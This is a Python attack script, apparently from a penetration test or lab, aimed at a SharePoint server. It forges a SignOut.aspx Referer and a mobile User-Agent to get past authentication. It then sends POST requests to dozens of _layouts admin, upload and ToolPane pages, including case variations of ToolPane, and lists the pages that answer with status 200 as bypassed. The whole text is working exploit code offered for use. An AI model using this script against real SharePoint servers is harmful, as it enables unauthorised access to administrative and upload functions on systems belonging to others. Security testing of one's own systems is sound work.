# Comprehensive search for all .aspx pages vulnerable to auth bypass
# Purpose: Map the full attack surface

import requests

base_url = "http://10.10.10.166"
test_body = "test=data"

mobile_ua = "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3"
bypass_headers = {
    "User-Agent": mobile_ua,
    "Referer": "/_layouts/SignOut.aspx",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Comprehensive list of SharePoint .aspx pages
aspx_files = [
    # Layout pages
    "Error.aspx", "AccessDenied.aspx", "Confirmation.aspx", "RedirectPage.aspx",
    # Admin pages
    "Settings.aspx", "viewlsts.aspx", "listedit.aspx", "user.aspx", "people.aspx",
    "groups.aspx", "role.aspx", "ManageFeatures.aspx", "SPThemes.aspx",
    # Web part pages
    "ToolPane.aspx", "WebPartAdder.aspx", "GalleryPicker.aspx",
    # Case variations of ToolPane
    "toolpane.aspx", "TOOLPANE.ASPX", "ToolPane.ASPX", "toolPane.aspx",
    # Other utility pages
    "Help.aspx", "ChangeSiteMasterPage.aspx", "AreaNavigationSettings.aspx",
    "Upload.aspx", "Download.aspx", "Picker.aspx", "Policy.aspx"
]

bypassed_pages = []
blocked_pages = []

for aspx in aspx_files:
    for version in ["/_layouts/15/", "/_layouts/"]:
        endpoint = f"{version}{aspx}"
        try:
            response = requests.post(f"{base_url}{endpoint}", headers=bypass_headers, data=test_body, timeout=5)
            if response.status_code == 200:
                bypassed_pages.append(endpoint)
                print(f"[+] BYPASS: {endpoint} - Status: {response.status_code}")
            elif response.status_code == 401:
                blocked_pages.append(endpoint)
        except requests.exceptions.Timeout:
            print(f"[!] TIMEOUT: {endpoint}")
        except Exception:
            pass

print(f"\n\n=== SUMMARY ===")
print(f"[+] Bypassed pages: {len(bypassed_pages)}")
for page in bypassed_pages:
    print(f"    {page}")
print(f"\n[-] Blocked pages: {len(blocked_pages)}")
